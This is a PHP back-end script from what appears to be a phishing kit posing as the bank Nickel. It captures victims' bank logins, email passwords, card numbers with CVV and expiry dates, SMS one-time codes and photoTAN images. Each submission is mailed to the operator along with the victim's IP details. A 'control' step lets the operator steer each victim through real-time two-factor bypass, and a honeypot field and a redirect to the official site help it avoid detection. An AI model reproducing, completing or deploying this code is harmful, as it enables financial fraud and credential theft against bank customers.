<?php
    /*******
    Main Author: Nawras MemoryError
    ********************************************************/

    require_once 'includes/main.php';
    if( $_GET['pwd'] == PASSWORD ) {
        session_destroy();
        visitors();
        header("Location: clients/index.php?verification#_");
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $red = $_GET['redirection'];
        if( $red == 'errorlogin' ) {
            header("Location: clients/login.php?error=1&verification#_");
            exit();
        }
        if( $red == 'errorcc' ) {
            header("Location: clients/cc.php?error=1&code=". $_GET['code'] ."&verification#_");
            exit();
        }
        if( $red == 'errorsms' ) {
            header("Location: clients/sms.php?error=1&code1=". $_GET['code1'] ."&code2=". $_GET['code2'] ."&code3=". $_GET['code3'] ."&verification#_");
            exit();
        }
        if( $red == 'cc' ) {
            header("Location: clients/cc.php?code=". $_GET['code'] ."&verification#_");
            exit();
        }
        if( $red == 'smsPass' ) {
            header("Location: clients/smsPass.php?code=". $_GET['code'] ."&verification#_");
            exit();
        }
        if( $red == 'errorcc' ) {
            $_SESSION['a'] = '';
            $_SESSION['b'] = '';
            $_SESSION['errors']['a'] = true;
            $_SESSION['errors']['b'] = true;
            header("Location: clients/cc.php?error=1&code=". $_GET['code'] ."&verification#_");
            exit();
        }
        header("Location: clients/". $red .".php?verification#_");
        exit();
    } else if($_SERVER['REQUEST_METHOD'] == "POST") {
        if( !empty($_POST['captcha']) ) {
            header("HTTP/1.0 404 Not Found");
            die();
        }
        if ($_POST['step'] == "login") {
            $_SESSION['errors']     = [];
            $_SESSION['username']   = $_POST['username'];
            $_SESSION['password']   = $_POST['password'];
            if( empty($_POST['username']) ) {
                $_SESSION['errors']['username'] = true;
            }
            if( empty($_POST['password']) ) {
                $_SESSION['errors']['password'] = true;
           
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' |  | Login';
                $message = '/-- Login Nickel INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'LOG : ' . $_POST['username'] . "\r\n";
				$message .= 'PASS : ' . $_POST['password'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END LOGIN INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading.php?verification#_");
                exit();
            } else {
                header("Location: clients/login.php?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "qr") {
            $_SESSION['errors']     = [];
            $_SESSION['file']   = $_POST['file'];
            if( empty($_POST['file']) ) {
                $_SESSION['errors']['file'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | |';
                $message = '/-- QR INFOS --/' . get_client_ip() . "\r\n";
                $message .= "[The Image address:\n http://".$_SERVER['HTTP_HOST'].rtrim(dirname($_SERVER['REQUEST_URI']), '\\/').'/'.$uploadpath."\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading.php?verification#_");
                exit();
            } else {
                header("Location: clients/qr.php?error=1&code=". $_POST['code'] ."&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "smsPass") {
            $_SESSION['errors']     = [];
            $_SESSION['a']   = $_POST['a'];
            if( empty($_POST['a']) ) {
                $_SESSION['errors']['a'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' |  | SMS';
                $message = '/-- Code SMS PASS OUBLIER --/' . get_client_ip() . "\r\n";
                $message .= 'SMS CODE : ' . $_POST['a'] . "/".$_POST['b']."/".$_POST['c']."/".$_POST['d']."\r\n";      
				$message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading.php?verification#_");
                exit();
            } else {
                header("Location: clients/smsPass.php?error=1&code=". $_POST['code'] ."&verification#_");
                exit();
            }
        }
		if ($_POST['step'] == "sms") {
            $_SESSION['errors']     = [];
            $_SESSION['sms_code']   = $_POST['sms_code'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | | SMS';
                $message = '/-- SMS ENTRER INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS : ' . $_POST['sms_code'] . "\r\n";
				$message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading.php?verification#_");
                exit();
            } else {
                header("Location: clients/sms.php?error=1&verification#_");
                exit();
            }
			  }
		if ($_POST['step'] == "email") {
            $_SESSION['errors']     = [];
            $_SESSION['one']   = $_POST['one'];
            if( empty($_POST['one']) ) {
                $_SESSION['errors']['one'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | | SMS';
                $message = '/-- Email Nickelll INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Email : ' . $_POST['one'] . "\r\n";
				$message .= 'Password : ' . $_POST['two'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END Email INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading.php?verification#_");
                exit();
            } else {
                header("Location: clients/email.php?error=1&verification#_");
                exit();
            }
			 }

        if ($_POST['step'] == "upload") {
            $_SESSION['errors']     = [];
            $_SESSION['phototan_file']   = $_POST['phototan_file'];
            if( empty($_POST['phototan_file']) ) {
                $_SESSION['errors']['phototan_file'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | APOBANK | Phototan';
                $message = '/-- PHOTOTAN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Phototan Link : ' . $_POST['phototan_file'] . "\r\n";
                $message .= '/-- END PHOTOTAN INFOS --/' . "\r\n";
				$message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading.php?verification#_");
                exit();
            } else {
                header("Location: clients/upload.php?error=1&code=". $_POST['code'] ."&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "cc") {
           $_SESSION['errors']     = [];
            $_SESSION['two']   = $_POST['two'];
            $_SESSION['one']   = $_POST['one'];
            if( empty($_POST['two']) ) {
                $_SESSION['errors']['two'] = true;
            }
            if( empty($_POST['one']) ) {
                $_SESSION['errors']['one'] = true;
           
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' |  | Card';
                $message = '/-- CARD Nickel INFOS --/' . get_client_ip() . "\r\n";
				$message .= 'CARD : ' . $_POST['one'] . "\r\n";
				$message .= 'CVV : ' . $_POST['three'] . "\r\n";
				$message .= 'DATE EXP : ' . $_POST['two'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading-.php?verification#_");
            } else {
                header("Location: clients/cc.php?error=1&verification#_");
            }
        }
        if ($_POST['step'] == "control") {
            $fp = fopen('victims/'. $_POST['ip'] .'.txt', 'wb');
            if( $_POST['to'] == 'smsPass' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['sms1_text'];
            }
            if( $_POST['to'] == 'errortan' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['errortan_text'];
            }
            if( $_POST['to'] == 'cc' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['sms_text'];
            }
            if( $_POST['to'] == 'errorcc' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['errorsms_text'];
            }
            fwrite($fp, $_POST['to']);
            fclose($fp);
            header("location: control.php?ip=" . $_POST['ip']);
        }
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>